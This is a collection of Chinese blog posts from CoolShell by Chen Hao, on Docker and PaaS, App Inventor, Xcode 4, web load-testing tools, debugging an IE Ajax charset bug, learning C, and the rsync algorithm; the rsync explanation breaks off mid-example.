好了，我们再用上面的标尺来量一下 Go 语言的杀手级应用 Docker，你会发现基本是一样的。* Docker 上手很容易。   * Docker 解决了运维中的环境问题以及服务调度的痛点。   * Docker 的生态圈中有大公司在后面助力。比如 Google。   * Docker 产出了工业界标准 OCI。   * Docker 的社区和生态圈已经出现像 Java 和 Linux 那样的态势。   * ……所以，早在 3、4 年前我就觉得 Docker 一定会是未来的技术。虽然当时的坑儿还很多，但是，相对于这些大的因素来说，那些小坑儿都不是问题。只是需要一些时间，这些小坑儿在未来 5-10 年就可以完全被填平了。同样，我们可以看到 Kubernetes 作为服务和容器调度的关键技术一定会是最后的赢家。这点我在去年初就能够很明显地感觉到了。关于 Docker 我还想多说几句，这是云计算中 PaaS 的关键技术，虽然，这世上在出现 Docker 之前，几乎所有的要玩公有 PaaS 的公司和产品都玩不起来，比如：Google 的 GAE，国内的各种 XAE，如淘宝的 TAE，新浪的 SAE 等。但我还是想说， **PaaS 是一个被世界或是被产业界严重低估的平台。**
**PaaS 层是承上启下的关键技术，任何一个不重视 PaaS 的公司，其技术架构都不可能让这家公司成长为一个大型的公司** 。因为 PaaS 层的技术主要能解决下面这些问题。* **软件生产线的问题。** 持续集成和持续发布，以及 DevOps 中的技术必需通过 PaaS。   * **分布式服务化的问题。** 分布式服务化的服务高可用、服务编排、服务调度、服务发现、服务路由，以及分布式服务化的支撑技术完全是 PaaS 的菜。   * **提高服务的可用性 SLA。** 提高服务可用性 SLA 所需要的分布式、高可用的技术架构和运维工具，也是 PaaS 层提供的。   * **软件能力的复用。** 软件工程中的核心就是软件能力的复用，这一点也完美地体现在 PaaS 平台的技术上。老实说，这些问题的关键程度已经到了能判断一家依托技术的公司的研发能力是否靠谱的程度。没有这些技术，依托技术拓展业务的公司几乎没有可能发展得规模很大。在后面，我会在“极客时间”我的付费专栏里另外写几篇文章详细地讲一下分布式服务化和 PaaS 平台的重要程度。最后，我还要说一下，为什么要早一点地进入这些新技术，而不是等待这些技术成熟了后再进入。原因有这么几个。
> 技术的发展过程非常重要。我进入 Go 和 Docker 的技术不能算早，但也不算晚，从 2012 年学习 Go，到 2013 年学习 Docker > 到今天，我清楚地看到了这两种技术的生态圈发展过程。让我收获最大的并不是这些技术本身，而是一个技术的变迁和行业的发展。从中，我看到了非常具体的各种思潮和思路，这些东西比起 Go 和 Docker 来说更有价值。因为，这不但让我重新思考我已掌握的技术以及如何更好地解决已有的问题，而且还让我看到了未来。我不但有了技术优势，而且这些知识还让我的技术生涯多了很多的可能性。> 这些关键新技术，可以让你拿到技术的先机。这些对一个需要技术领导力的个人或公司来说都是非常重要的。一个公司或是个人能够占有技术先机，就会比其它公司或个人有更大的影响力。一旦未来行业需求引爆，那么这个公司或是个人的影响力就会形成一个比较大的护城河，并可以快速地产生经济利益。近期，在与中国移动、中国电信以及一些股份制银行进行交流的过程中，我已看到通讯行业、金融行业对于 PaaS 平台的理解已经超过了互联网公司，而我近 3 年来在这些技术上的研究让我也从中受益非浅。所以，Go 语和 Docker 作为 PaaS 平台的关键技术前途是无限的，我很庆幸赶上了这个浪潮，也很庆幸在 3 年前我就看到了这个趋势，现在我也在用这些技术开发相关的技术产品，助力于为高速成长的公司提供这些关键技术。
**最后注明一下：****这篇文章于上周发布于“极客时间”的我的付费专栏中。极客时间中的付费是我受Geekbang邀请写的一个付费专栏，因为过去10多年给企业有过很多内训，过去2年又给好多企业做过一些咨询工作，所以，我会把一些商业化的内容写在极客时间里，当然，也会有一些我的新文章。关于这个事，我后面我专门开一篇文章说一下。（大家可以到 Apple的App Store上搜极客时间，Android版本等到12月初吧）   **（全文完）# Google App Inventor作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnGoogle 本周一发布了一个新的工作可以让任何人创建Android手机应用。这个工具叫 **Google App Inventor**。（目前， App Inventor好像只对教育者开放）Google说：“你不必是一个专业开发人员就能轻松使用App Inventor。使用App Inventor无须掌握编程知识。因为你根本就不需要编写代码，你只需在可视化界面上设计应用的界面，并使用“blocks”指定应用的行为（behavior）。”
Google Android App Inventor注意，Google说的是任何人，也就是包括那些不会编程的人。这个工具可以将枯燥的代码变成了一块一块的拼图，你需要做的只是把这些零散的拼图按照你自己的意思组合在一起，点击生成，你的第一个 Android 程序就诞生了。这里有一篇来自 纽约时代的报道，《纽约时代》报道称，App Inventor已经在六年级的孩子们中完成测试，他们能够使用App Inventor制作简单的应用。如果你可以访问Youtube的话，你可以看看这个视频。这个想法，这会让 Android 市场不仅对程序开放，而且我们可能看到还有一大批很有创意但不懂编程的人为这个平台添砖加瓦，当然，这也可能会出现很多垃圾应用，正如不会做网页的人用所见即所得的编辑器做出的那些相当ugly劣质网页一样。瑕不蔽玉，就算是有大量的劣质应用的出现，我也相信，同样会涌现出更多更好的应用，那些都是技术人员无法做到的。当然，这种想法以前也有，不过仅仅是当玩具玩玩，这回，做这个事的是Google，我不知道他能把这个事情做成什么样？但觉得可能会比较专业。如果只是整成另一个VB的翻版嘛，那就很囧了。让我们看看，最终这个玩意， **会成为像Dreamweaver或Flash那样把网页开发变成傻瓜化，还是会像VB那样把程序员变成傻瓜** 。
*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 苹果开发工具Xcode 4 第二预览版作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn今天，苹果公司向开发者发布Xcode 4 Preview 2，这是一个IDE用来开发在Mac，iPhone，iPad上应用程序的工具。在这个第二预览版中，主要有以下新的功能：* 这个版本不像以往的版本有太多的窗口，其把以前那些窗口督统一起来，只有一个窗口。   * 集成了Interface Builder（以前这个东东和Xcode是两个东西）   * Xcode Assistant 可以让你的设计和代码同时呈现。   * LLVM Compiler 2.0。LLVM是下一代的编译器，其完全支持C，C++和Objective C，而且编译的速度和编译成的执行速度都快于GCC。同时也引入了LLDB做为新的调试器。   * 多版本编译。这个功能可以让你在IDE中编译两个版本的代码，而且可以和Subversion或Git集成。你可以访问 What’s New 来看看具体的细节。
苹果开发工具Xcode 4 Preview 2# 十个免费的Web压力测试工具作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn两天，jnj在本站发布了《如何在低速率网络中测试 Web 应用》，那是测试网络不好的情况。而下面是十个免费的可以用来进行Web的负载/压力测试的工具，这样，你就可以知道你的服务器以及你的WEB应用能够顶得住多少的并发量，以及你的网站的性能。我相信，北京奥组委的订票网站的开发团队并不知道有这样的测试工具。**Grinder** – Grinder是一个开源的JVM负载测试框架，它通过很多负载注射器来为分布式测试提供了便利。 支持用于执行测试脚本的Jython脚本引擎HTTP测试可通过HTTP代理进行管理。根据项目网站的说法，Grinder的 主要目标用户是“理解他们所测代码的人——Grinder不仅仅是带有一组相关响应时间的‘黑盒’测试。由于测试过程可以进行编码——而不是简单地脚本 化，所以程序员能测试应用中内部的各个层次，而不仅仅是通过用户界面测试响应时间。**Pylot** -Pylot是一款开源的测试web service性能和扩展性的工具，它运行HTTP 负载测试，这对容量计划，确定基准点，分析以及系统调优都很有用处。Pylot产生并发负载（HTTP Requests），检验服务器响应，以及产生带有metrics的报表。通过GUI或者shell/console来执行和监视test suites。
**Web Capacity Analysis Tool (WCAT)** – 这是一种轻量级负载生成实用工具，不仅能够重现对 Web 服务器（或负载平衡服务器场）的脚本 HTTP 请求，同时还可以收集性能统计数据供日后分析之用。WCAT 是多线程应用程序，并且支持从单个源控制多个负载测试客户端，因此您可以模拟数千个并发用户。该实用工具利用您的旧机器作为测试客户端，其中每个测试客户端又可以产生多个虚拟客户端（最大数量取决于客户端机器的网络适配器和其他硬件）。您可以选择使用 HTTP 1.0 还是 HTTP 1.1 请求，以及是否使用 SSL。并且，如果测试方案需要，您还可以使用脚本执行的基本或 NTLM 身份验证来访问站点的受限部分。（如果您的站点使用 cookie、表单或基于会话的身份验证，那您可以创建正确的 GET 或 POST 请求来对测试用户进行身份验证。）WCAT 还可管理您站点可能设置的任何 cookie，所以配置文件和会话信息将永久保存。**fwptt** – fwptt 也是一个用来进行WEB应用负载测试的工具。它可以记录一般的请求，也可以记录Ajax请求。它可以用来测试 asp.net， jsp， php 或是其它的Web应用。
**JCrawler** – JCrawler是一个开源( CPL) 的WEB应用压力测试工具。通过其名字，你就可以知道这是一个用Java写的像网页爬虫一样的工具。只要你给其几个URL，它就可以开始爬过去了，它用一种特殊的方式来产生你WEB应用的负载。这个工具可以用来测试搜索引擎对你站点产生的负载。当然，其还有另一功能，你可以建立你的网站地图和再点击一下，将自动提交Sitemap给前5名的搜索引擎！**Apache JMeter** – Apache JMeter是一个专门为运行和服务器装载测试而设计的、100％的纯Java桌面运行程序。原先它是为Web/HTTP测试而设计的，但是它已经扩展以支持各种各样的测试模块。它和用于HTTP和SQL数据库（使用JDBC）的模块一起运送。它可以用来测试静止资料库或者活动资料库中的服务器的运行情况，可以用来模拟对服务器或者网络系统加以重负荷以测试它的抵抗力，或者用来分析不同负荷类型下的所有运行情况。它也提供了一个可替换的界面用来定制数据显示，测试同步及测试的创建和执行。**Siege** -Siege（英文意思是围攻）是一个压力测试和评测工具，设计用于WEB开发这评估应用在压力下的承受能力：可以根据配置对一个WEB站点进行多用户的并发访问，记录每个用户所有请求过程的相应时间，并在一定数量的并发访问下重复进行。 Siege 支持基本的认证，cookies， HTTP 和 HTTPS 协议。
**http_load** – http_load 以并行复用的方式运行，用以测试web服务器的吞吐量与负载。但是它不同于大多数压力测试工具，它可以以一个单一的进程运行，一般不会把客户机搞死。可以可以测试HTTPS类的网站请求。**Web Polygraph** – Web Polygraph这个软件也是一个用于测试WEB性能的工具，这个工具是很多公司的标准测试工具，包括微软在分析其软件性能的时候，也是使用这个工具做为基准工具的。很多招聘测试员的广告中都注明需要熟练掌握这个测试工具。**OpenSTA** – OpenSTA是一个免费的、开放源代码的web性能测试工具，能录制功能非常强大的脚本过程，执行性能测试。例如虚拟多个不同的用户同时登陆被测试网站。其还能对录制的测试脚本进行,按指定的语法进行编辑。在录制完测试脚本后，可以对测试脚本进行编辑，以便进行特定的性能指标分析。其较为丰富的图形化测试结果大大提高了测试报告的可阅读性。OpenSTA 基于CORBA 的结构体系，它通过虚拟一个proxy，使用其专用的脚本控制语言，记录通过proxy 的一切HTTP/S traffic。通过分析OpenSTA的性能指标收集器收集的各项性能指标，以及HTTP 数据，对系统的性能进行分析。
欢迎您留下你认为不错的WEB应用性能测试的工具。# 一次Ajax查错的经历作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn先说故事，再说想法吧。我有一朋友做网站，用jQuery的Ajax方法从后端载入一段HTML代码然后动态插入到网页的Div元件中。这个东西太普遍了。jQuery强大的load方法可以完成这个事情。朋友的代码是这么写的：[javascript]var tab = jQuery("#dynamic_tab");   var url = "/list_ajax/";   tab.load(url);[/javascript]简单到不能再简单了。在Chrome，Firefox，Safari下运行一点问题也没有，只有IE不行，不管是IE7，IE8，还是IE9。问题的症壮是，使用IE访问那个Ajax的链接，没有问题，但是在jQuery的Ajax方法返回了“undefined”的respons对象。没有任何报错！怎么搞也搞不定，只好Google了一下——“jQuery load IE”，一看，很多人都在问这个问题。于是开始了散弹枪编程方式。
排在第一的就是StackOverflow被浏览了33K次的这个问题：jQuery’s .load() not working in IE – but fine in Firefox, Chrome and Safari，答案没有被打勾（不靠谱），StackOverflow还有很多人问相似的问题，不过都没有答案。不管三七二十一，先试了一下，散弹枪嘛。试了半天都没有用。然后上Google查，又看到有人说的IE缓存的问题，什么，要把cache设置成false，或是用下面的方法来解决：[javascript]var tab = jQuery("#dynamic_tab");   var fuckie = Math.random();   var url = "/list_ajax/"+"?fuckie="+fuckie;   tab.load(url);[/javascript]反正还是一样，统统不Work，几乎所有的都试了，都不Work。搞了一天的朋友恼怒道：“Microsoft应该快点倒闭吧，产品太烂了”。IE的确是太烂了。于是我用IE9的网页调试器可以看到点了Ajax的链接后， **IE对网站有http的Ajax请求，也可以看到请求返回了，但是就是不显示在我的页面上——jQuery的Ajax的responseText为undefined!**
对于我这个老家伙，对jQuery也不熟，我只得开始调试jQuery的代码，想看看里面干了什么，报了什么错？调了一个小时，基本上把jQuery的Ajax的封装看懂了七七八八了，但是还是没找到为什么有问题。于是，我只得架起原生态的Ajax，看看IE的那个Ajax的ActiveX的对象干了什么事？写了下面的代码（当年写Ajax就是这么写的，所以也不费劲，况且网上还有例程可以抄）：[javascript]   function InitAjax()   {   var ajax=false;   try {   ajax = new ActiveXObject("Msxml2.XMLHTTP");   } catch (e) {   try {   ajax = new ActiveXObject("Microsoft.XMLHTTP");   } catch (E) {   ajax = false;   }   }   if (!ajax && typeof XMLHttpRequest!=’undefined’) {   ajax = new XMLHttpRequest();   }   return ajax;   }
一运行，还是不行，没见IE报什么错，不过，可以确定这不是jQuery的问题了，估计还是我们自己程序的问题。不过此时的程序太好调试了，调试中，在IE9下调式发现原生的IE的Ajax对象在onreadystatechange函数里，其responseText是下面这个样子：什么是“ **系统错误: -1072896658** ”？上google一查，一堆页面，基本上是说乱码了，也就是ajax的后端程序返回的网页编码不认识吧。需要在返回的http header里加上 charset=utf-8。于是，修改后端的Ajax的程序，明确指定了返回的HTTP Header中的charset，于是IE下就工作正常了，再切回jQuery的load代码，一切正常了（后端的程序本来是utf-8的编码格式，但是不骨明确在HTTP Header中指定，但是只有IE不会自动检测）。这个问题的原因就是因为我们没有按照规范去写网页。所以，举一反三，HTML的规范还有哪些，太多了，记也记不住。但也许你会知道 **有一个叫 的网站可以帮你校验你网页中的很多不规范的东西**。这个工具会报很多很多错，很多都有点吹毛求疵，不过，可以让你看看（注：今天的coolshell装了很多插件，也被我调过一些东西，所以出错很多，我还记得以前没有插件没有我定制化的样式的时候，Wordpress一个错都不报）。
#### 后记我把这个问题和过程分享出来，主要有这么几个目的，并抛出几个问题，大家可以思考一下：1）这个问题网上有很多人都在报，但是基本上找不到答案（包括StackOverflow），所以，我分享出来，填补一下空白。2）我相信我们的程序员天天都在经历这样的事，我不知道大家在遇到这样的事情会怎么做？也许大多数人都在网上查各种解决方案，然后一个一个的试，直到试对了——散弹枪式的编程，呵呵。当然，大多数答案都是可能找到的。但 **当我们找到答案了后，我们还会深入去了解这个问题的具体原因并举一反三地去思考一其周边的东西吗** ？3）另外，在今天这样N多框架，N多lib，N多开源的年代下， **不知道大家有没有失去了从零开始自己写代码的能力？** 比如上面的这个问题，不知道有多少人还会自己写原生态的Ajax？不过，我还是建议大家能在使用各种框架的时候，明白那些最基础的知识，求甚解，知其然知其所以然，真的很重要。我是从那个“吃糠的年代”过来的程序员，那时的程序员什么都要自己干，很辛苦，今天我和很多人说我以前的那些经历，会被笑话，但是我从这些什么都自己的干的年代过的经历，让我受益很多。我把我的想法分享给大家，希望对大家有用。
(全文完)# Visual Studio的Vim插件作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn前两天向大家介绍了Eclipse 和Vim相互交融的插件，今天向大介绍几个插件，可以让你在Visual Studio中使用Vim的那些操作。第一个是：ViEmu，下面是一个演示图片。不过这个插件是商业版的，而且还不支持VS2010。不过据其网站说很快就会支持。最夸张的是ViEmu还支持Word和Outlook，SQL Server，呵呵。如果你要用免费的的插件，没有问题，试工这个新出的插件吧：VsVim。只不过好像目前只支持VS2010。****看来Vim还是很强大的，不然，怎会有这些人把其集成到了 Eclipes 和Vistual Studio中，呵呵。Unix下的这个老得都不行了的编辑器正在影响着图形界面的编辑器。最后，让我问问你，你会用Vim吗？# 某Python实现的尾部递归作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnmailper 在2009年4月26的文章里《Guido认为程序员大多数工作不需要递归》谈及递归不是编程的基础。并且在python中并没有实现尾部递归Tail Recurssion。
但是，今天我们却看见了某Python实现的尾部递归!snake：）# C语言和sh脚本的杂交代码作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在网上看到了一个把 C语言和bash杂并起来的例子，这个示子如下所示。在下面这个例子中，我们把脚本用#if 0这个预编译给起来，这样就不会让其编译到C语言中了。下面，让我看看如果来使用这样的程序：$ sh test.sh.c     Hello from bash!     $ gcc test.sh.c -o test     $ ./test     Hello from C!你甚至还可以做一个自我编译，并自我运行的源代码。如下所示：运行：$ sh test.sh.c     Hello from C!     $当然，我并不建议你在真正的开发环境中这样使用，我只不过是在介绍一个比较有趣的用法，仅此而已！# 中国仍是IE6的重灾区作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn“IE6于10年前诞生，现在应该是我们同IE6告别的时候了。”微软公司日前推出IE6倒计时网站（the Internet Explorer 6 Countdown，网址为www.ie6countdown.com），旨在尽早淘汰IE6，让用户升级到新版IE浏览器。
值得注意一点的是，在这张百分比图上所显示的目前仍在使用IE6浏览器上网的百分比第一的是中国——34.5%，这个符合我国国情——什么都要争第一。我国人口世界第一占全世界1/4，网民也是世界第一，还在使用IE6的网民占全世界的1/3，可以我国网民的严重落后。根据CNNIC今年的报告，我国现有4.5亿网民，34%也就是1.5亿用户，也就是说你身边每三个人中就有一个在用IE6。而中国的IE6网民占全世界使用IE6网民的一半。另外，我发现亚洲是重灾区啊，包括中日韩台印都很猛啊，看来微软在亚洲的营销的确不错。我查看了一下Coolshell.cn的2011年到今天为止访问统计，排名第一是的Chrome(41.5%)，第二位的是Firefox(23.22%)，第三位的是IE8(10.7%)，第四位的是IE6(4.8%)。IE6的IP数有6400+。看来，在我国程序员这个人群中，越来越多的人使用Chrome+Firefox，挺喜人的，但是IE6还有4.8%，还不如土耳其，马来西亚，印尼等国家。# 如何学好C语言作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
有人在酷壳的留言版上询问下面的问题> keep_walker **:**   >  今天晚上我看到这篇文章。   >   > > 我也遇到了和提问的老外一样的问题。。能给像遇到这样烦恼的程序员一点建议嘛？谢谢！我相信，这可能是很多朋友的问题，我以前也有这样的感觉，编程编到一定的时候，发现能力到了瓶颈，既不深，也不扎实，半吊子。比如：你长期地使用Java和.NET ，这些有虚拟机的语言对于开发便利是便利，但是对于程序员来说可能并不太好，原因有两个：1. 虚拟机屏蔽了操作系统的系统调用，以及很多底层机制。   2. 大量的封装好的类库也屏蔽了很多实现细节。一段时间后，你会发现你知其然，不知所以然。。我以前在CSDN上写过一篇《 **Java NIO类库Selector机制解析（上，下，续）**》，在那篇文章中我说提到过（有讥讽的语气）Java的程序员不懂底层实现，所以很难把技术学得更扎实。此时，一部分程序员会不自然地想学学底层的技术，很自然的，C语言就被提了上来。下面是我给这位朋友的一些建议：* **鼓励并为你叫好** 。我鼓励你想要去学C语言的想法和精神，很多人都觉得C语言好学，其实并不然。（你可以看看《C语言的迷题》）现在的这个社会更多地去关注那些时髦的技术，而忽略了这个流行了40+年的C语言。 **一门技术如果能够流行40多年，这才是你需要去关注和学习的技术** ，而不是那些刚出来的技术（过度炒作的技术，Windows编程史）。这才是踏踏实实的精神。
* **不要找借口** 。这一条路走下来并不容易，不要给自己找借口。我最不喜欢听到的就是“ **很忙，没有时间** ”这样的借口。我以前在银行做项目，早9点到晚10点，周一到周六，我一样可以每天抽1个小时来看书和专研，一年下来也能精读5、6本书。我现在的工作项目和招聘任务很紧张，刚生的小孩只有自己和老婆两人带，还需要准备讲课，但是我还是能够找到时间看文章写文章维护酷壳。所以，我可以告诉你，“ **时间就像乳沟，只要你肯挤，就一定会有** ”。* **学好C语言和系统编程** 。我认为，学好编程有四个方面： **语言、算法和数据结构、系统调用和设计** 。      * **语言** 。我可以告诉你C语言有两大主题你要好好学，一个是内存管理，一个是指针！这个世界上90%以上的C/C++出的严重性错误全是和这两个有关。不要看谭浩强的那本书，那本是本烂书。推荐这本书给你《C程序设计语言（第2版·新版）》     * **算法和数据结构** 。我认为，用C语言实现算法和数据结构莫过于最爽的事情。推荐你看这本书——算法:C语言实现(第1～4部分)基础知识、数据结构、排序及搜索(原书第3版)，还有那本经典的《算法导论》     * **系统编程** 。Windows下推荐两本书——《Windows 程序设计 》和《Windows核心编程》，Unix/Linux下推荐两本书——《Unix高级环境编程》和《Unix网络编程卷1，套接字》《Unix网络编程卷2，进程间通信》尤其是《Unix网络编程》这本书，一通百通，无论Windows还是Unix/Linux，都是一样的。     * **系统设计** 。关于设计方面，我全力推荐《Unix编程艺术》，看完以后，你就明白什么是真正的编程文化了。然后，当你看到Windows的Fans的某些言论时，你就知道什么叫一笑了之了。
如果你能在2-3年内精读完这些书，并全部融会贯通，那么你就明白什么是一览众山小的感觉了！我足足花了5年时间才算是真正全部读完这些书的。最后，祝你好运！努力！_**——-更新：2011/03/29 20:00——-**_我想，这篇文章主要想告诉大家这么几件事：* 编程编到一定时候，你就需要了解底层系统的机制，否则，知其然不知所以然。   * 我没有否定非C的程序员的逻辑，真正的逻辑是——如果你想要了解底层机制，请学习C语言和操作系统。   * 40多年的Unix/C影响深远。包括影响了Windows。如果你想一通百通，一定要了解Unix。那是计算机文化真正的根。   * 不要肤浅地去思考问题。比如，不要以为一个DBA就不会考虑数据库引擎的内存页面的问题。也不要以为Web程序员就不需要了解后台的服务器和脚本的运行性能以及TCP/IP的问题。**高手往往都是有很强的系统的基础知识的，表面的东西永远是肤浅的。**# DEMO Spring 2010 获奖产品作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn_文章来 _源_ mashable.com_&utm_content=Google+Reader)
在刚刚结束的 DEMO Spring 2010 中，执行制作人 Matt Marshall 宣布了获得 DEMO 大奖的各类 IT 产品，以及由大众评选出的最佳产品，作为奖品， DEMO 将为该产品提供价值100万美元的 IDG 广告宣传。以下是各类奖项的归属：**移动产品Zosh**Zosh 是一个 iPhone 应用。有了Zosh，你无需使用扫描仪或者传真机即可实现对文档签名，Zosh支持的文档格式有：PDF，Office，以及图像文档。点此处查看 _产品详情_ 。具体操作方法：1\. 打开邮件中的附件文档，将其发送至Zosh（本地）。2\. 在Zosh中打开该文档，使用手写输入签名。3\. 将签名作为一个“图层”合并到文档中。**社交和媒体产品Everloop**Everloop 是一个网络社交应用，目标用户是8到13岁的儿童。其现在是一个 White Label 产品（由一个公司开发，但由其他公司进行再包装和市场营销的产品），很快将会独立运营。**基于云计算的产品Gwabbit**Gwabbit 已经两次获得 DEMO God 奖项。它的新产品 Gwabbit Cloud Sync 帮助你从 Outlook 和 Blackberry 邮件中提取发件人信息，然后通过 Gwabbit 服务保存和同步。
**消费电子产品Phone Halo**Phone Halo 通过电子标签来管理你的手机、钥匙和钱包等贵重物品，在你有可能遗失它们的时候发出警报，从而大大降低遗失的概率。 点此处查看 _产品介绍_ 。Phone Halo 的工作方式大致如下：1\. 在你的手机、钥匙和钱包等贵重物品上贴上有感应装置的电子标签。2\. 在你的手机上安装 Phone Halo 应用程序。3\. 当你忘记携带其中任何一项物品时，也就是你的手机无法感应到其他物品时，手机将会发出报警。如果你没有听到报警声，手机会发送电子邮件给你的亲朋好友，让他们来提醒你忘记了东西。（根据 Phone Halo 的预测或曰期望，在 2010 年的美国，将有五分之一的人遗失他们的手机，十分之一的人遗失他们的钱包，四分之一的人遗失他们的钥匙，看来该产品很有市场前景）**企业级应用BlueSkies Hospitality **BlueSkies Hospitality Restaurant 2.0 是一个餐饮行业解决方案，主要和 OpenTable 争夺市场。**概念产品UppyMedia TAGtheLOOK**TAGtheLOOK 是一个 Facebook 应用，它可以让你在自己或者朋友的时装照片上贴上标签，并且与其他人分享这些标签来展示你的时尚品味。这个应用能给网上时尚商店带来潜在的商机。
**大众评选产品eXaudios MagInify Call Center**MagInify 是这样一个工具，它能够解码客户讲话的声音和音调，以判断客户情绪的好坏，从而帮助呼叫中心和客服人员分析统计服务质量，发现不足。# rsync 的核心算法作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnrsync是unix/linux下同步文件的一个高效算法，它能同步更新两处计算机的文件与目录，并适当利用查找文件中的不同块以减少数据传输。rsync中一项与其他大部分类似程序或协定中所未见的重要特性是镜像是只对有变更的部分进行传送。rsync可拷贝／显示目录属性，以及拷贝文件，并可选择性的压缩以及递归拷贝。rsync利用由Andrew Tridgell发明的算法。这里不介绍其使用方法，只介绍其核心算法。我们可以看到，Unix下的东西，一个命令，一个工具都有很多很精妙的东西，怎么学也学不完，这就是Unix的文化")啊。本来不想写这篇文章的，因为原先发现有很多中文blog都说了这个算法，但是看了一下，发现这些中文blog要么翻译国外文章翻译地非常烂，要么就是介绍这个算法介绍得很乱让人看不懂，还有错误，误人不浅，所以让我觉得有必要写篇rsync算法介绍的文章。（当然，我成文比较仓促，可能会有一些错误，请指正）
目录* 问题   * 算法   * rolling checksum算法   * 图示#### 问题首先， 我们先来想一下rsync要解决的问题，如果我们要同步的文件只想传不同的部分，我们就需要对两边的文件做diff，但是这两个问题在两台不同的机器上，无法做diff。如果我们做diff，就要把一个文件传到另一台机器上做diff，但这样一来，我们就传了整个文件，这与我们只想传输不同部的初衷相背。于是我们就要想一个办法，让这两边的文件见不到面，但还能知道它们间有什么不同。这就出现了rsync的算法。#### 算法rsync的算法如下：（ **假设我们同步源文件名为fileSrc，同步目的文件叫fileDst** ）1） **分块Checksum算法** 。首先，我们会把fileDst的文件平均切分成若干个小块，比如每块512个字节（最后一块会小于这个数），然后对每块计算两个checksum，* 一个叫rolling checksum，是弱checksum，32位的checksum，其使用的是Mark Adler发明的adler-32算法，   * 另一个是强checksum，128位的，以前用md4，现在用md5 hash算法。
为什么要这样？因为若干年前的硬件上跑md4的算法太慢了，所以，我们需要一个快算法来鉴别文件块的不同，但是弱的adler32算法碰撞概率太高了，所以我们还要引入强的checksum算法以保证两文件块是相同的。 **也就是说，弱的checksum是用来区别不同，而强的是用来确认相同** 。（checksum的具体公式可以参看这篇文章）2） **传输算法。** 同步目标端会把fileDst的一个checksum列表传给同步源，这个列表里包括了三个东西， **rolling checksum(32bits)** ， **md5 checksume(128bits)** ， **文件块编号** 。我估计你猜到了同步源机器拿到了这个列表后，会对fileSrc做同样的checksum，然后和fileDst的checksum做对比，这样就知道哪些文件块改变了。但是，聪明的你一定会有以下两个疑问：* 如果我fileSrc这边在文件中间加了一个字符，这样后面的文件块都会位移一个字符，这样就完全和fileDst这边的不一样了，但理论上来说，我应该只需要传一个字符就好了。这个怎么解决？* 如果这个checksum列表特别长，而我的两边的相同的文件块可能并不是一样的顺序，那就需要查找，线性的查找起来应该特别慢吧。这个怎么解决？
很好，让我们来看一下同步源端的算法。3） **checksum查找算法** 。同步源端拿到fileDst的checksum数组后，会把这个数据存到一个hash table中，用rolling checksum做hash，以便获得O(1)时间复杂度的查找性能。这个hash table是16bits的，所以，hash table的尺寸是2的16次方，对rolling checksum的hash会被散列到0 到 2^16 – 1中的某个整数值。（对于hash table，如果你不清楚，建议回去看大学时的数据结构教科书）顺便说一下，我在网上看到很多文章说，“要对rolling checksum做排序”（比如这篇和这篇），这两篇文章都引用并翻译了原作者的这篇文章，但是他们都理解错了，不是排序，就只是把fileDst的checksum数据，按rolling checksum做存到2^16的hash table中，当然会发生碰撞，把碰撞的做成一个链表就好了。这就是原文中所说的第二步——搜索有碰撞的情况。4） **比对算法** 。这是最关键的算法，细节如下：4.1）取fileSrc的第一个文件块（我们假设的是512个长度），也就是从fileSrc的第1个字节到第512个字节，取出来后做rolling checksum计算。计算好的值到hash表中查。
4.2）如果查到了，说明发现在fileDst中有潜在相同的文件块，于是就再比较md5的checksum，因为rolling checksume太弱了，可能发生碰撞。于是还要算md5的128bits的checksum，这样一来，我们就有 2^-(32+128) = 2^-160的概率发生碰撞，这太小了可以忽略。 **如果rolling checksum和md5 checksum都相同，这说明在fileDst中有相同的块，我们需要记下这一块在fileDst下的文件编号** 。4.3）如果fileSrc的rolling checksum 没有在hash table中找到，那就不用算md5 checksum了。表示这一块中有不同的信息。总之，只要rolling checksum 或 md5 checksum 其中有一个在fileDst的checksum hash表中找不到匹配项，那么就会触发算法对fileSrc的rolling动作。于是， **算法会住后step 1个字节，取fileSrc中字节2-513的文件块要做checksum，go to (4.1)** – 现在你明白什么叫rolling checksum了吧。
4.4）这样，我们就可以找出fileSrc相邻两次匹配中的那些文本字符，这些就是我们要往同步目标端传的文件内容了。#### **rolling checksum算法**这个算法很简单，也叫Rabin-Karp 算法，由 Richard M. Karp 和 Michael O. Rabin 在 1987 年发表，它也是用来解决多模式串匹配问题的。其最大的精髓是，当我们往后面step 1个字符的时候，不用全部重新计算所有的checksum，也就是说，我们从 [0, 512] rolling 到 [1, 513] 时，我们不需要重新计算从1到513的checksum，而是重用 [0，512]的checksum直接算出来。这个算法比较简单，我举个例子，我们有一个数字：12345678，假设我们以5个长度作为一个块，那么，第一个块就是 12345 ，12345可以表示为：` 1 * 10^4 + 2 * 10^3 + 3 * 10^2 + 4 * 10^1 + 5 * 10^0 = 12345 `如果我们要step 1步，也就是要得到 23456， 我们不必计算：`2 * 10^4 + 3 * 10^3 + 4 * 10^2 + 5 * 10^1 + 6 * 10^0`
